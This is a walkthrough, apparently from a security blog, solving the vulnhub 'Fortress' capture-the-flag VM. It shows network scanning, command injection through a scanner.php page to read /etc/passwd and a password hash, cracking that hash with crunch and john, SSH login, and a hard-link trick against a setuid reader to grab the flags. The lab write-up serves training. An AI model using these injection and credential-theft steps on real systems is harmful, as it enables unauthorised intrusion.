@@ -1,0 +1,364 @@
+
+								
+																		Hack the Fortress VM (CTF Challenge)
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on December 29, 2016
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									today we are going to solve another CTF challenge “FORTRESS” of the vulnhub labs. The level of this challenge is not so tough and its difficulty level is described as medium. Solving this lab will give you a good experience of web penetration testing.
+You can download it from here: https://www.vulnhub.com/entry/dc416-2016,168/
+Penetrating Methodology
+
+Network Scanning (Nmap, netdiscover)
+Abusing HTTP service (Burp-suite)
+Generating Dictionary (crunch)
+Cracking Hash (john the ripper)
+SSH login
+Capture the 2nd flag and 3rd flag
+
+Let’s Begin!!
+Start with the netdiscover command to identify target IP in the local network, in my network 192.168.1.109 is my target IP, you will get yours.
+
+		
+		
+			
+			
+			
+			
+netdiscover
+			
+				
+					
+				
+					1
+				
+						netdiscover
+					
+				
+			
+		
+
+
+Further, let’s enumerate open ports and protocols information of the target’s network with help of nmap following command:
+
+		
+		
+			
+			
+			
+			
+nmap -A 192.168.1.109
+			
+				
+					
+				
+					1
+				
+						nmap -A 192.168.1.109
+					
+				
+			
+		
+
+As shown in port 22, 80, 443 are open, let’s penetrate more. 
+
+So we explore target IP in the web browser and welcomed by the following image.
+
+After making lots of efforts I decided to use dirbuster for directory brute-force. Type dirbuster on the terminal and automatically OWASP dirbuster window gets open. Here browse your dictionary from /usr/share/dirbuster/wordlists and choose your appropriate wordlist as I select medium.txt, do not forget to address target URL in the top of the text field as http//192.168.0.109 and finally hit the start button.
+
+Luckily!!! I found something which is a scanner.php file.
+
+So when I explored scanner.php in the web browser, it put-up the following web page in front of us.  So when I trigger the localhost IP we got the result of Nmap scan which you can perceive from below image. I also tried to breach it through some kind of command injection but hard luck! all seems to be wasted here.
+
+Then I decide to capture the HTTP request in burp suite and send the intercepted request into the repeater.
+
+Look over given below image here you will find two panels left and right for request and response respectively.
+Type ls as request and click on go tab. This will generate a response to the request you made.
+
+		
+		
+			
+			
+			
+			
+Request: ls
+Response: index.html
+k1ngd0m_k3yz
+logo.png
+s1kr3t
+scanner.php
+styles.css
+			
+				
+					
+				
+					1234567
+				
+						Request: lsResponse: index.htmlk1ngd0m_k3yzlogo.pngs1kr3tscanner.phpstyles.css
+					
+				
+			
+		
+
+
+So among 4 directories enumerated above, we ran ls command again to check the list of /s1kr3t and found flag.txt as a response.
+Request: ls
+Response: flag.txt
+
+Now repeat the process till the last step of making a request and getting a response through the repeater. With help of cat command, we found the 1st flag.
+Request: cat flag.txt
+Response: FLAG{n0_one_br3aches_teh_f0rt} 
+
+Then we try to a checklist of k1ngd0m_k3yz and found two files inside it.
+Request: ls k1ngd0m_k3yz
+Response: master and passwd
+
+So I open the master file and found a single entry of /etc/passwd file for user craven along with password hash.
+Request: cat k1ngd0m_k3yz/master
+Let’s copy the hash password in a text file and named it hash.txt
+
+Then I open /k1ngd0m_k3yz/passwd where I didn’t found any remarkable clue.
+
+ 
+Then I try to open /etc/passwd file and as you can observe, inside burp response, we got the passwd file and I found an entry for two local users: vulnhub &amp; Craven.
+
+Then, I try to get into a/home/craven directory in order to view the present list with the following request.
+Request: ls  /home/craven
+Response: I got three files flag.txt, hint.txt, and remainder.txt.
+
+ 
+ 
+First I try to flag.txt but fail to read it, then inside hint.txt we got some hint for the user password.
+
+ 
+Then I open a reminder.txt file that gave me a list to buy.
+
+ 
+Then with help of hint.txt and remainder.txt, we have generated a dictionary using crunch. Crunch is a wordlist generator where you can specify a standard character set or a character set you specify.
+
+		
+		
+			
+			
+			
+			
+crunch 10 10 -t %%%qwerty^ &gt; dict.txt
+			
+				
+					
+				
+					1
+				
+						crunch 10 10 -t %%%qwerty^ &gt; dict.txt
+					
+				
+			
+		
+
+
+If you remember we have already enumerated hash password for craven from inside k1ngd0m_k3yz/master. Use john the ripper to crack the password with help crunch dictionary generated above.
+
+		
+		
+			
+			
+			
+			
+cd Desktop
+john --wordlist=dict.txt hash.txt
+			
+				
+					
+				
+					12
+				
+						cd Desktopjohn --wordlist=dict.txt hash.txt
+					
+				
+			
+		
+
+931qwerty? is the password for craven as you can perceive from the given image.
+
+If you remember the result from nmap which shows port 22 is open now try to connect the target through SSH using above credential.
+
+		
+		
+			
+			
+			
+			
+ssh craven@192.168.1.109
+			
+				
+					
+				
+					1
+				
+						ssh craven@192.168.1.109
+					
+				
+			
+		
+
+Yesss!! We got login successfully, now when I checked the list of current directory, I found flag.txt.
+
+		
+		
+			
+			
+			
+			
+ls
+cat flag.txt
+			
+				
+					
+				
+					12
+				
+						lscat flag.txt
+					
+				
+			
+		
+
+Luckily found 2nd FLAG {w0uld_u_lik3_som3_b33r_with_ur_r3d_PiLL}
+
+It was very tough to get the third flag.txt but with help of the following command, we reached to the final flag.
+
+		
+		
+			
+			
+			
+			
+cd /home
+ls             
+cd vulnhub
+ls
+cat flag.txt
+./reader flag.txt
+			
+				
+					
+				
+					123456
+				
+						cd /homels             cd vulnhublscat flag.txt./reader flag.txt
+					
+				
+			
+		
+
+For finding the 3rd flag we applied the symlink process and successfully grabbed the last flag also.
+
+		
+		
+			
+			
+			
+			
+cd /tmp
+ln /home/vulnhub/flag.txt raj
+cd /home/vulnhub
+./reader /tmp/raj
+			
+				
+					
+				
+					1234
+				
+						cd /tmpln /home/vulnhub/flag.txt rajcd /home/vulnhub./reader /tmp/raj
+					
+				
+			
+		
+
+Finally, I found 3rd FLAG{its_A_ph0t0_ph1ni5h}
+
+Author: Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
